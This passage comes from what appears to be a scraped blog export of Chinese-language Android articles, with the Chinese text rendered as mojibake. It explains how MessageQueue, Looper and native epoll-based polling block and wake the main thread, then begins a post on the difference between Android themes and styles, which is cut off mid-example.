Message p = mMessages; boolean needWake; if (p == null || when == 0 || when &lt; p.when) { // New head, wake up the event queue if blocked. msg.next = p; mMessages = msg; needWake = mBlocked; } else { // Inserted within the middle of the queue. Usually we don&#39;t have to wake // up the event queue unless there is a barrier at the head of the queue // and the message is the earliest asynchronous message in the queue. needWake = mBlocked &amp;&amp; p.target == null &amp;&amp; msg.isAsynchronous(); Message prev; for (;;) { prev = p; p = p.next; if (p == null || when &lt; p.when) { break; } if (needWake &amp;&amp; p.isAsynchronous()) { needWake = false; } } msg.next = p; // invariant: p == prev.next prev.next = msg; } // We can assume mPtr != 0 because mQuitting is false. if (needWake) { nativeWake(mPtr); } } æ³¨æ„nativeWakeæ–¹æ³•ï¼Œåœ¨æ»¡è¶³ä¸€å®šæƒ…å†µä¸‹ä¼šå”¤é†’çº¿ç¨‹æ€»ç»“ä¸€ä¸‹å°±æ˜¯postDelayedç¡®å®è°ƒç”¨äº†é˜»å¡çº¿ç¨‹çš„æ–¹æ³•ï¼Œä½†ä¸€æ—¦æ¶ˆæ¯é˜Ÿåˆ—å‰é¢æ’å…¥äº†å¯æ‰§è¡Œçš„messageï¼Œä¼šè°ƒç”¨å”¤é†’çº¿ç¨‹çš„æ–¹æ³•ã€‚è¿™äº›å¤§éƒ¨åˆ†åœ¨MessageQueueè¿™ä¸ªclassä¸­ï¼Œçœ‹ä¸€ä¸‹åŸºæœ¬éƒ½èƒ½æ˜ç™½ã€‚ å›é¡¾ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹:ä¸»çº¿ç¨‹ä½œä¸ºä¸€ä¸ªThreadï¼ŒæŒæœ‰ä¸€ä¸ªLooperå¯¹è±¡ï¼ŒLooperæŒæœ‰ä¸€ä¸ªMessageQueueçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶ä¸€ä¸ªä¸€ä¸ªåœ°ä»ä¸­å–å‡ºæ»¡è¶³æ‰§è¡Œæ—¶é—´æ¡ä»¶çš„Messageï¼Œæ‰§è¡ŒMessgaeçš„callbackæˆ–è€…äº¤ç»™Handlerçš„handleMessageå»å¤„ç†ã€‚ 5. update MessageQueueé‡Œé¢æœ‰ä¸ªIdleHandler,å¯ä»¥åœ¨æ¶ˆæ¯é˜Ÿåˆ—ç©ºäº†æ—¶å€™å®‰æ’ä¸€äº›äº‹æƒ…å»åšï¼ŒGlideç”¨äº†è¿™ä¸ªç‰¹æ€§ï¼Œåœ¨ä¸»çº¿ç¨‹ä¸é‚£ä¹ˆå¿™çš„æ—¶å€™åšäº†ä¸€äº›äº‹ nativePoolOnceèƒ½å¤ŸæŒ‚èµ·ä¸»çº¿ç¨‹å’Œå”¤é†’ä¸»çº¿ç¨‹çš„åŸç†æ˜¯ä½¿ç”¨äº†linuxçš„ç®¡é“ï¼š ä»¥ä¸‹æ–‡å­—å‡ºè‡ªAndroidåº”ç”¨ç¨‹åºæ¶ˆæ¯å¤„ç†æœºåˆ¶ï¼ˆLooperã€Handlerï¼‰åˆ†æ ç®¡é“æ˜¯Linuxç³»ç»Ÿä¸­çš„ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼Œå…·ä½“å¯ä»¥å‚è€ƒå‰é¢ä¸€ç¯‡æ–‡ç« Androidå­¦ä¹ å¯åŠ¨ç¯‡æ¨èçš„ä¸€æœ¬ä¹¦ã€ŠLinuxå†…æ ¸æºä»£ç æƒ…æ™¯åˆ†æã€‹ä¸­çš„ç¬¬6ç« â€“ä¼ ç»Ÿçš„Uinxè¿›ç¨‹é—´é€šä¿¡ã€‚ç®€å•æ¥è¯´ï¼Œç®¡é“å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨ç®¡é“çš„ä¸¤ç«¯ï¼Œåˆ†åˆ«æ˜¯ä¸¤ä¸ªæ‰“å¼€æ–‡ä»¶æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™ä¸¤ä¸ªæ‰“å¼€æ–‡ä»¶æè¿°ç¬¦éƒ½æ˜¯å¯¹åº”åŒä¸€ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯ç”¨æ¥è¯»çš„ï¼Œåˆ«ä¸€ä¸ªæ˜¯ç”¨æ¥å†™çš„ï¼Œä¸€èˆ¬çš„ä½¿ç”¨æ–¹å¼å°±æ˜¯ï¼Œä¸€ä¸ªçº¿ç¨‹é€šè¿‡è¯»æ–‡ä»¶æè¿°ç¬¦ä¸­æ¥è¯»ç®¡é“çš„å†…å®¹ï¼Œå½“ç®¡é“æ²¡æœ‰å†…å®¹æ—¶ï¼Œè¿™ä¸ªçº¿ç¨‹å°±ä¼šè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œè€Œå¦å¤–ä¸€ä¸ªçº¿ç¨‹é€šè¿‡å†™æ–‡ä»¶æè¿°ç¬¦æ¥å‘ç®¡é“ä¸­å†™å…¥å†…å®¹ï¼Œå†™å…¥å†…å®¹çš„æ—¶å€™ï¼Œå¦‚æœå¦ä¸€ç«¯æ­£æœ‰çº¿ç¨‹æ­£åœ¨ç­‰å¾…ç®¡é“ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹å°±ä¼šè¢«å”¤é†’ã€‚è¿™ä¸ªç­‰å¾…å’Œå”¤é†’çš„æ“ä½œæ˜¯å¦‚ä½•è¿›è¡Œçš„å‘¢ï¼Œè¿™å°±è¦å€ŸåŠ©Linuxç³»ç»Ÿä¸­çš„epollæœºåˆ¶äº†ã€‚ Linuxç³»ç»Ÿä¸­çš„epollæœºåˆ¶ä¸ºå¤„ç†å¤§æ‰¹é‡å¥æŸ„è€Œä½œäº†æ”¹è¿›çš„pollï¼Œæ˜¯Linuxä¸‹å¤šè·¯å¤ç”¨IOæ¥å£select/pollçš„å¢å¼ºç‰ˆæœ¬ï¼Œå®ƒèƒ½æ˜¾è‘—å‡å°‘ç¨‹åºåœ¨å¤§é‡å¹¶å‘è¿æ¥ä¸­åªæœ‰å°‘é‡æ´»è·ƒçš„æƒ…å†µä¸‹çš„ç³»ç»ŸCPUåˆ©ç”¨ç‡ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å…¶å®åªéœ€è¦ç›‘æ§çš„IOæ¥å£åªæœ‰mWakeReadPipeFdä¸€ä¸ªï¼Œå³å‰é¢æˆ‘ä»¬æ‰€åˆ›å»ºçš„ç®¡é“çš„è¯»ç«¯ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦ç”¨åˆ°epollå‘¢ï¼Ÿæœ‰ç‚¹ç”¨ç‰›åˆ€æ¥æ€é¸¡çš„å‘³é“ã€‚å…¶å®ä¸ç„¶ï¼Œè¿™ä¸ªLooperç±»æ˜¯éå¸¸å¼ºå¤§çš„ï¼Œå®ƒé™¤äº†ç›‘æ§å†…éƒ¨æ‰€åˆ›å»ºçš„ç®¡é“æ¥å£ä¹‹å¤–ï¼Œè¿˜æä¾›äº†addFdæ¥å£ä¾›å¤–ç•Œé¢è°ƒç”¨ï¼Œå¤–ç•Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å£æŠŠè‡ªå·±æƒ³è¦ç›‘æ§çš„IOäº‹ä»¶ä¸€å¹¶åŠ å…¥åˆ°è¿™ä¸ªLooperå¯¹è±¡ä¸­å»ï¼Œå½“æ‰€æœ‰è¿™äº›è¢«ç›‘æ§çš„IOæ¥å£ä¸Šé¢æœ‰äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå°±ä¼šå”¤é†’ç›¸åº”çš„çº¿ç¨‹æ¥å¤„ç†ï¼Œä¸è¿‡è¿™é‡Œæˆ‘ä»¬åªå…³å¿ƒåˆšæ‰æ‰€åˆ›å»ºçš„ç®¡é“çš„IOäº‹ä»¶çš„å‘ç”Ÿã€‚ æœ‰ä¸€ä¸ªå¼€å‘è€…æ°¸è¿œä¸åº”è¯¥ä¸»åŠ¨è°ƒç”¨çš„æ–¹æ³•ï¼šçºµè§‚æ•´ä¸ªAndroidç³»ç»Ÿï¼ŒLopperçš„è¿™ä¸ªæ–¹æ³•åªåœ¨ä¸¤å¤„è¢«è°ƒç”¨ã€‚ /** * Initialize the current thread as a looper, marking it as an * application&#39;s main looper. The main looper for your application * is created by the Android environment, so you should never need * to call this function yourself. See also: {@link #prepare()} */ public static void prepareMainLooper() { prepare(false); synchronized (Looper.class) { if (sMainLooper != null) { throw new IllegalStateException(&quot;The main Looper has already been prepared.&quot;); } sMainLooper = myLooper(); } } android.app.ActivityThreadä¸­å’Œcom.android.server.SystemServerä¸­åˆ†åˆ«è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œè¨€ä¸‹ä¹‹æ„systemServerè™½ç„¶è·‘åœ¨app_processè¿›ç¨‹ä¸­ï¼Œä½†å…¶å®ä¹Ÿè¿˜æ˜¯æœ‰ä¸€ä¸ªlooperçš„å¾ªç¯æ¨¡å‹çš„ã€‚ KeyEventä¸æ˜¯æ¨åˆ°handler queueçš„InputEventæœ‰2ä¸ªå­ç±»ï¼šKeyEventå’ŒMotionEventï¼Œå…¶ä¸­KeyEventè¡¨ç¤ºé”®ç›˜äº‹ä»¶ï¼Œè€ŒMotionEventè¡¨ç¤ºç‚¹å‡»äº‹ä»¶ã€‚BlockCanaryæœ‰äº›äº‹æƒ…æ˜¯æ‹¿ä¸åˆ°çš„ //è¿™ç§æ˜¯èµ°handlerçš„ at android.os.Handler.handleCallback(Handler.java:751) at android.os.Handler.dispatchMessage(Handler.java:95) at android.os.Looper.loop(Looper.java:154) at android.app.ActivityThread.main(ActivityThread.java:6119) at java.lang.reflect.Method.invoke(Method.java:-1) // è¿™ç§å°±ä¸èµ°handler at android.view.ViewRootImpl$WindowInputEventReceiver.onInputEvent(ViewRootImpl.java:6349) at android.view.InputEventReceiver.dispatchInputEvent(InputEventReceiver.java:185) at android.os.MessageQueue.nativePollOnce(MessageQueue.java:-1) at android.os.MessageQueue.next(MessageQueue.java:323) at android.os.Looper.loop(Looper.java:136) AndroidPerformanceMonitor(BlockCanary)çš„ç¼ºé™·,ä¸èƒ½æ£€æµ‹è§¦æ§äº‹ä»¶å¤„ç†çš„blocknativePollOnceç›´æ¥è°ƒç”¨äº†android.view.InputEventReceiver.dispatchInputEventã€‚åŸå› åœ¨è¿™ä¸€æ®µä»£ç  // Called from native code. //ç›´æ¥ç”±nativeç«¯è°ƒç”¨ @SuppressWarnings(&quot;unused&quot;) private void dispatchInputEvent(int seq, InputEvent event) { mSeqMap.put(event.getSequenceNumber(), seq); onInputEvent(event); } cppå±‚åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œ env-&gt;CallVoidMethod(receiverObj.get(), gInputEventReceiverClassInfo.dispatchInputEvent, seq, inputEventObj, displayId); Looper.cppåˆ©ç”¨epollæœºåˆ¶æ¥æ”¶events,å¹¶è°ƒç”¨callbackå›è°ƒçš„handleEventæ–¹æ³•. mMessageQueue-&gt;getLooper()-&gt;addFd(fd, 0, events, this, NULL); NativeMessageQueueçš„åˆ›å»ºå’Œdestoryjavaå±‚çš„é¡ºåº:Looper.prepare -&gt; new Looper -&gt; new MessageQueue -&gt; MessageQueueçš„æ„é€ å‡½æ•°é‡Œå¼€å§‹è¿›å…¥jni-&gt; nativeInitæ–¹æ³• -&gt;c++å±‚å¼€å§‹ -&gt; åˆ›å»ºnew NativeMessageQueue -&gt; NativeMessageQueueçš„æ„é€ å‡½æ•°é‡Œé¢åˆ›å»ºä¸€ä¸ªLooper -&gt; Looperçš„æ„é€ å‡½æ•°é‡Œé¢è°ƒç”¨äº†linuxå‡½æ•°eventfd(åˆ›å»ºmWakeEventFd)ï¼Œepoll_create(åˆ›å»ºepollå®ä¾‹)å’Œepoll_ctl(å°†mWakeEventFdæ·»åŠ åˆ°epollå®ä¾‹ä¸­ï¼Œå…³æ³¨EPOLLINäº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯åé¢æœ‰è°å¾€è¿™ä¸ªmWakeEventFdé‡Œé¢å†™ä¸œè¥¿äº†ï¼Œå°±ä¼šå”¤é†’ä¼‘çœ åœ¨epoll_waitçš„çº¿ç¨‹) -&gt; è¿”å›NativeMessageQueueçš„æŒ‡é’ˆ(long)ç»™javaå±‚ nativePollOnce(ptr, nextPollTimeoutMillis)æ˜¯ä¸€ä¸ªnativeæ–¹æ³•å…ˆè¯´ç»“è®º #include &lt;sys/epoll.h&gt; // ç­‰å¾…æ—¶é—´å‘ç”Ÿæˆ–è€…è¶…æ—¶ï¼Œåœ¨nativeWake()æ–¹æ³•ï¼Œå‘ç®¡é“å†™ç«¯å†™å…¥å­—ç¬¦ï¼Œåˆ™æ–¹æ³•ä¼šè¿”å›ã€‚ int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis); //è¿™ä¸ªtimeoutMilliså’Œjavaçš„nativeæ–¹æ³•ä¼ è¿‡æ¥çš„é¢„è®¡çš„ä¸‹ä¸€ä¸ªmsgçš„æ—¶é—´æœ‰å…³ã€‚ epoll_waitæ˜¯ä¸€ä¸ªlinuxå‡½æ•°ï¼Œçœ‹ä¸‹æ–‡æ¡£ä¸Šå¯¹è¿™ä¸ªtimeoutçš„æè¿°: The timeout argument specifies the number of milliseconds that epoll_wait() will block. Time is measured against the CLOCK_MONOTONIC clock. The call will block until either: * a file descriptor delivers an event; * the call is interrupted by a signal handler; or * the timeout expires. æ‰€ä»¥è¦ä¹ˆæ˜¯javaå±‚é€šè¿‡nativeWakeæ–¹æ³•å¾€ç®¡é“é‡Œå†™äº†æ•°æ®å”¤é†’äº†è¯¥çº¿ç¨‹ï¼Œè¦ä¹ˆæ˜¯timeoutåˆ°äº†ã€‚æ¥çœ‹è°ƒç”¨é¡ºåºï¼Œjavaå±‚:MessageQueue.nativePollOnce(ptr, nextPollTimeoutMillis) -&gt;è¿›å…¥c++å±‚nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis) -&gt;mLooper-&gt;pollOnce(timeoutMillis); -&gt;Looper-&gt;pollInner(timeoutMillis); -&gt;int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis); //åˆ°æ­¤å°±æ˜¯é˜»å¡åœ¨è¿™é‡Œç­‰å¾…å”¤é†’ï¼ŒeventCountä»£è¡¨äº‹ä»¶æ€»æ•°ã€‚æ¥ä¸‹æ¥ä¼šéå†eventCountæ¬¡ï¼Œå‘ç°EPOLLINçš„äº‹ä»¶å°±awoken()ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨readå‡½æ•°ï¼Œä½¿å¾—mWakeFdçš„å¯è¯»çŠ¶æ€è¢«æ¸…é™¤ã€‚ é‡ç‚¹æ˜¯epoll_waitè¿”å›ï¼Œä¹Ÿå°±æ˜¯javaå±‚çš„nativePollOnceæ–¹æ³•ä¸å†é˜»å¡ï¼ˆå®ç°äº†ç”¨ä¸è€—cpuçš„æ–¹å¼ç­‰å¾…ç‰¹å®šmillisecondsçš„æ–¹å¼ï¼‰ã€‚ å‚è€ƒæ¶ˆæ¯å¤„ç†æµç¨‹æ˜¯å…ˆå¤„ç†NativeMessageï¼Œå†å¤„ç†Native Requestï¼Œæœ€åæ‰èƒ½ä»pollInneræ–¹æ³•è¿”å›ï¼Œè¿™æ‰èƒ½ä»jniæ–¹æ³•è¿”å›ï¼Œè¿™æ‰èƒ½æ‰§è¡ŒJava Messageã€‚ç†è§£äº†è¯¥æµç¨‹ä¹Ÿå°±æ˜ç™½äº†æœ‰æ—¶ä¸Šå±‚æ¶ˆæ¯å¾ˆå°‘ï¼Œä½†å“åº”æ—¶é—´å´æ¯”è¾ƒé•¿çš„çœŸæ­£åŸå› ã€‚ nativeWakeæ–¹æ³•å¤šæ•°æ˜¯åœ¨javaå±‚çš„enqueMessageçš„æ—¶å€™è°ƒç”¨çš„ã€‚ï¼ˆåº”è¯¥æ˜¯å½“å‰è¢«syncBarrieræŒ¡ä½äº†ï¼Œæ–°æ¥çš„ä¸€ä¸ªmsg.isAsynchronousçš„æ—¶å€™ï¼‰ã€‚nativeWakeä¹Ÿæ˜¯ä¸€ä¸ªnativeæ–¹æ³•ï¼Œc++å±‚çš„å®ç°æœ€ç»ˆæ˜¯åœ¨ Looper.cpp è¿™ä¸ªæ–‡ä»¶é‡Œã€‚ void Looper::wake() { #if DEBUG_POLL_AND_WAKE ALOGD(&quot;%p ~ wake&quot;, this); #endif uint64_t inc = 1; // å‘ç®¡é“mWakeEventFdå†™å…¥å­—ç¬¦1 ssize_t nWrite = TEMP_FAILURE_RETRY(write(mWakeEventFd, &amp;inc, sizeof(uint64_t))); // çœ‹è§æ²¡ï¼Œå°±æ˜¯å¾€ä¸€ä¸ªmWakeEventFdé‡Œé¢å†™äº†ä¸€ä¸ª1 if (nWrite != sizeof(uint64_t)) { if (errno != EAGAIN) { ALOGW(&quot;Could not write wake signal, errno=%d&quot;, errno); } } } c++å±‚çš„looperæ˜¯å®ç°nativePollOnceçš„æ ¸å¿ƒ è¿™é‡Œé¢å…³æ³¨pollInneræ–¹æ³•, javaå±‚çš„messageQueueä¹Ÿæ˜¯å€ŸåŠ©äº†C++å±‚çš„looperå®ç°äº†é˜»å¡æ“ä½œä¸é˜»å¡cpu æ€§èƒ½æ£€æµ‹ï¼Œä¾‹å¦‚æ£€æµ‹activity startç­‰ç”Ÿå‘½å‘¨æœŸæ—¶é—´çš„æ–¹æ³•è¿˜æœ‰ä¸€ä¸ª,android.util.EventLogè¿™ä¸ªclassæœ‰ä¸€ä¸ªreadEventsæ–¹æ³•ï¼Œå¯ä»¥ä»é‡Œé¢è¯»å–åˆ°çš„ä¿¡æ¯åŒ…æ‹¬totalTime, layoutTime ä»¥åŠdrawTimeç­‰å…¶å®å°±æ˜¯æå‡ºæ¥ä¸€å †æ—¥å¸¸ä¼šåœ¨logcaté‡Œé¢çœ‹åˆ°çš„æ—¥å¿—ï¼Œç³»ç»Ÿå°†è¿™äº›ä¿¡æ¯éƒ½æ ¹æ®ä¸åŒçš„äº‹ä»¶ç±»å‹åˆ†ä¸ºä¸åŒçš„tagæ‰“å°å‡ºæ¥äº†ï¼Œä¾‹å¦‚am_activity_launch_time,am_activity_fully_drawn_time,am_kill(æŸä¸ªè¿›ç¨‹è¢«å¹²æ‰äº†) ä¾‹å¦‚launcherè¢«å¹²æ‰äº† Reference Handler.postDelayed()æ˜¯å¦‚ä½•ç²¾ç¡®å»¶è¿ŸæŒ‡å®šæ—¶é—´çš„ How the Main Thread works å®‰å“ä¸­ä¸ºä»€ä¹ˆä¸»çº¿ç¨‹ä¸ä¼šå› ä¸ºLooperä¸­çš„æ­»å¾ªç¯è€Œå¡æ­»ï¼Ÿ","tags":[{"name":"Handler Message","slug":"Handler-Message","permalink":"https://haldir65.github.io/tags/Handler-Message/"}]},{"title":"Themeå’ŒStyleçš„åŒºåˆ«","date":"2016-10-10T19:35:32.000Z","path":"2016/10/10/2016-10-10-theme-versus-style/","text":"è®¤è¯†Themeå’ŒStyles é‡æ–°çœ‹ä¸€éUsing Themes and styles without going crazyï¼Œå¤§éƒ¨åˆ†å±äºç›´æ¥ç¿»è¯‘ 1. Styles1.1 é¦–å…ˆï¼Œåœ¨layoutæ–‡ä»¶ä¸­ï¼ŒStyleå¯ä»¥å°†ä¸€äº›é‡å¤çš„ï¼Œå…·æœ‰å…±æ€§çš„å±æ€§æå–å‡ºæ¥&lt;View android:background= &quot;#ff0000&quot; /&gt; å˜æˆ &lt;View style= &quot;@Style/MyStyle&quot; /&gt; &lt;Style name = &quot;MyStyle&quot;&gt; &lt;item name = &quot;android:background&quot;&gt;#ff0000&lt;/item&gt; &lt;/Style&gt; è¿™ç§å½¢å¼ï¼Œå¯¹äºå¤§é‡çš„å…·æœ‰ç›¸åŒå±æ€§çš„ä¸”å…·æœ‰å…±æ€§çš„Viewï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å¯¹åº”çš„Styleï¼Œè¿™èƒ½å¤Ÿè®©layoutæ–‡ä»¶æ›´åŠ æ•´æ´ã€‚å‰ææ˜¯ç¡®ä¿¡layoutæ–‡ä»¶ä¸­ä½¿ç”¨çš„Viewå…·æœ‰ç›¸åŒçš„å±æ€§ã€‚ 1.2 Style InheritanceStyleå¯ä»¥ç»§æ‰¿ï¼Œä¸¤ç§æ–¹å¼ï¼š å‡è®¾æœ‰parent style ï¼Œä¸€ç§åœ¨nameä¸­ä½¿ç”¨å‰ç¼€çš„æ–¹å¼æŒ‡æ˜parentï¼Œå¦ä¸€ç§åœ¨åé¢æ˜¾å¼çš„å£°æ˜parent &lt;style name = &quot;Parent&quot;/&gt; Explicit child &lt;style name = &quot;Child&quot; parent = &quot;Parent&quot;&gt; Implicit Child &lt;style name = &quot;Parent.Child&quot;/&gt; åŒæ—¶ä½¿ç”¨ä¸¤ç§æ–¹å¼æ—¶ï¼Œé»˜è®¤ä½¿ç”¨Explicit Parent ä¸ºé¿å…æ··æ·†ï¼Œæ¨èä½¿ç”¨Explicit Childä¸”Child nameä¸å¸¦å‰ç¼€ Viewä¸èƒ½æ‹¥æœ‰ä¸¤ä¸ªStyle,é™¤äº†TextViewåŠå…¶å­ç±»ï¼Œä¾‹å¦‚ &lt;TextView&gt; android:textColor = &quot;#ffffff&quot; style=&quot;@style/SomeStyle&quot; android:textAppearance = &quot;@style/MyText&quot; &lt;/TextView&gt; å¦‚ä¸Šæ‰€ç¤ºï¼ŒTextViewä¸­å¯ä»¥å®šä¹‰TextAppearanceï¼Œåè€…åŒ…å«äº†å¸¸è§çš„textColorï¼ŒtextSizeç­‰attributesï¼Œè€Œåœ¨ä¸€ä¸ªViewä¸­å¯ä»¥åŒæ—¶å®šä¹‰ä¸¤ä¸ªStyleã€‚å¦‚æœå‡ºç°å†²çªï¼Œstylesä¹‹é—´ç›¸åŒattributesçš„åº”ç”¨ä¼˜å…ˆçº§ä¸ºï¼š android:textColor &gt;&gt; SomeStyleä¸­çš„android:textColor&gt;&gt;MyTextä¸­çš„android:textColor ä½¿ç”¨TextAppearance æ—¶ä¸€å®šè¦æœ‰ä¸€ä¸ªparent &lt;style name = &quot;MyText&quot; parent=&quot;TextAppearance.Appcompat&quot;&gt; &lt;item name = &quot;android:TextColor&quot;&gt;#F08&lt;/item&gt; &lt;/style&gt; å› ä¸ºä½¿ç”¨styleæ—¶ï¼Œç³»ç»Ÿå°†æŠŠstyleä¸­å®šä¹‰çš„attributeå’Œå½“å‰Viewçš„é»˜è®¤attributeèåˆèµ·æ¥ï¼Œè€ŒTextViewé»˜è®¤attribute ä¸­ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œé€ æˆtextSize = 0çš„æƒ…å†µï¼Œæ‰€ä»¥åŠ¡å¿…é€‰æ‹©parentï¼Œåœ¨parent styleå·²ç»å®šä¹‰å¥½å¤§å¤šæ•°å±æ€§çš„æƒ…å†µä¸‹å†å»ä¿®æ”¹å°éƒ¨åˆ†å±æ€§å°†ç®€å•å¾—å¤šã€‚TextAppearanceå¯ä»¥åœ¨Themeä¸­å®šä¹‰ï¼Œä¹Ÿå¯ä»¥å†™åœ¨å•ä¸€çš„TextViewä¸Šã€‚ 2. Themes åœ¨Androidä¸­ï¼ŒThemeåå­—ä»¥â€Theme.â€å¼€å¤´ï¼ŒæŸ¥çœ‹æºç ä¼šå‘ç°åªæ˜¯å®šä¹‰äº†ä¸€å¤§å †color attributes å’ŒWindow attributesã€‚Themesæ¯”Stylesçš„ä½œç”¨èŒƒå›´æ›´å¹¿ï¼Œthemeså¯ä»¥åœ¨Application,Activityå±‚é¢ç®¡ç†Widgetå¤–è§‚ï¼ŒThemeè¿˜å¯ä»¥å®ç°å¤œé—´æ¨¡å¼åˆ‡æ¢ æ¥çœ‹å¦‚ä½•å®šä¹‰ä¸€ä¸ªTheme &lt;style name = &quot;Theme&quot;&gt; &lt;item name = android:statusBarColor&gt;#ff0000&lt;/item&gt; &lt;/style&gt; å›å¤´çœ‹ä¸€ä¸‹Style &lt;Style name = &quot;Style&quot;&gt; &lt;item name = &quot;android:background&quot;&gt;#ff0000&lt;/item&gt; &lt;/Style&gt; è¯­æ³•çœ‹èµ·æ¥å®Œå…¨ä¸€æ ·ã€‚ åŒºåˆ«ï¼šstylesä¸­çš„å±æ€§è¢«ç›´æ¥é€åˆ°Viewçš„æ„é€ å‡½æ•°ä¸­ï¼Œè®°å¾—åœ¨è‡ªå®šä¹‰Viewæ—¶å†™çš„é‚£äº›attrså—ï¼Œå…¶å®å°±æ˜¯ä¸¤ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°ä¸­çš„AttributeSets Themeåº”ç”¨èŒƒå›´æ›´å¹¿ï¼Œå®šä¹‰çš„å±æ€§å’ŒStyleä¹Ÿä¸å°½ç›¸åŒã€‚ ä¸¤è€…ä¹‹é—´æœ‰ä¸€äº›è”ç³»ï¼šä¾‹å¦‚Themeä¸­å¯ä»¥å®šä¹‰default widget styleï¼ŒStyleå¯ä»¥å¼•ç”¨Themeä¸­å®šä¹‰çš„å±æ€§(?attr:selectableItemBackgroundè¿˜è®°å¾—å—) ä¸Šé¢æåˆ°äº†Themeä¸­å¯ä»¥å®šä¹‰default widget styleï¼Œå…·ä½“åšæ³•æ— éå°±æ˜¯è¿™æ ·: &lt;style name= &quot;MyTheme&quot; parent=&quot;Theme.AppCompat.Light&quot;&gt; &lt;item name=&quot;android:editTextStyle&quot;&gt;@style/MyEditTextStyle&lt;/item&gt; &lt;/style&gt; æ‰€ä»¥ï¼Œåªè¦åœ¨AppThemeä¸­ç‚¹è¿›å»ï¼Œæ‰¾ä¸€ä¸‹è¿™ä¸ªé”®å¯¹åº”çš„å€¼å°±å¯ä»¥äº† 2.1 ä½¿ç”¨Theme ä¸¤ç§æ–¹å¼: 1.åœ¨Manifestä¸­ï¼Œä¾‹å¦‚ &lt;application android:theme=&quot;@style/Theme.AppCompat&quot; /&gt; æˆ–è€… &lt;activity android:theme=&quot;@style/Theme.AppCompat.Light&quot; /&gt; activtyä¸­Theme override Applicationçš„Theme åº”ç”¨äºView Lollipopå¼€å§‹å¼•å…¥View Themingçš„æ¦‚å¿µ &lt;Toolbar android:theme=&quot;@style/ThemeOverlay.AppCompat.Dark.ActionBar&quot; app:popupTheme=&quot;@style/ThemeOverlay.AppCompa.Light&quot;/&gt; åº”ç”¨åœ¨Viewä¸Šçš„Themeå°†èƒ½å¤Ÿä½œç”¨åœ¨è¯¥ViewåŠå…¶æ‰€æœ‰çš„Childrenï¼Œè¿™æ ·åšçš„å¥½å¤„åœ¨äºæ²¡æœ‰å¿…è¦ä¸“é—¨ä¸ºäº†ä¸€ä¸ªViewè€Œå»é€‰æ‹©å…¶ä»–çš„Themeã€‚ ä¾‹å¦‚åœ¨Holoä¸­æœ‰Holo.Light.DarkActionBarï¼Œä¸ºäº†ä¸“é—¨é€‚é…ActionBaréœ€è¦ä¸€ä¸ªä¸“é—¨çš„Themeã€‚ç›®å‰çœ‹æ¥ä¸»è¦åº”ç”¨åœ¨Toolbarä¸Šã€‚ 3 .å¢™è£‚æ¨èä½¿ç”¨AppCompat å¥½å¤„: Material on all devices ,è®°å¾—ä»¥å‰å¬è¯´AppCompatåœ¨21ä»¥ä¸Šç»§æ‰¿è‡ªTheme.Materialã€‚ Baseline themes/styles AppCompat é¢„è®¾äº†ä¸€ç³»åˆ—æ ·å¼æ ‡å‡†ï¼Œåªéœ€è¦ç»§æ‰¿AppCompatï¼Œæ”¹åŠ¨ä¸€å°éƒ¨åˆ†æ ·å¼å°±èƒ½å®Œæˆè®¾è®¡ Enable View theming pre-Lollipop ä½¿ç”¨ColorPrimary , ColorAccentç­‰attributes(backPorted by AppCompat)è®¾ç½®Widgetæ ·å¼ åœ¨Themeä¸­å¯ä»¥å®šä¹‰é»˜è®¤çš„Widgetæ ·å¼ï¼Œä¾‹å¦‚ &lt;style name=&quot;AppTheme&quot; parent = &quot;Theme.AppCompat&quot;&gt; &lt;item name=&quot;android:spinnerItemStyle&quot;&gt;@sytle/MySpinnerStyle&lt;/item&gt; &lt;/style&gt; è¿˜å¯ä»¥æ›´æ”¹é»˜è®¤æ ·å¼ï¼š &lt;style name = &quot;AttrTheme&quot; parent =&quot;Theme.AppCompat&quot;&gt; &lt;item name =&quot;selectableItemBackground&quot;&gt;@drawable/bg&lt;/item&gt; &lt;/style&gt; &lt;Button android:background=?attr/selectableItemBackground&quot;/&gt; è¿™æ ·å°±å¯ä»¥è‡ªå®šä¹‰ç‚¹å‡»æ—¶çš„Drawableäº†ã€‚ æ”¯æŒandroid:theme: API 7+(åªåº”ç”¨äºè¯¥View)ï¼ŒAPI 11+(ViewåŠå…¶å­View) View themingåŸæœ¬åªæ˜¯API 21æ‰å¼•å…¥çš„æ¦‚å¿µï¼ŒAppCompatå®ç°äº†å‘å‰å…¼å®¹ 4 . ?attrçš„é—®é¢˜ ?android:attr/selectableItemBackground ä¸€ä¸ªä¸ªæ¥è§£é‡Šï¼š ? : weâ€™re doing a theme lookup android: weâ€™re looking up something within the android namespace attr/ : weâ€™re looking for an attribute(å¯çœç•¥) selectableItemBackground: The name of the atribute weâ€™re looking up æŠŠattr/çœç•¥æ‰åå˜æˆ ?android:selectableItemBackground æ•ˆæœå®Œå…¨ä¸€æ · &lt;style name=&quot;MyTheme&quot;&gt; &lt;item name = &quot;android:colorPrimary&quot;&gt;@color/red&lt;/item&gt; &lt;/style&gt; é—®é¢˜åœ¨äºandroid:ColorPromaryæ˜¯Lollipopæ‰å¼•å…¥çš„ï¼Œè§£å†³æ–¹æ¡ˆ &lt;syle name = &quot;MyTheme&quot; parent=&quot;Theme.AppCompat&quot;&gt; &lt;item name = 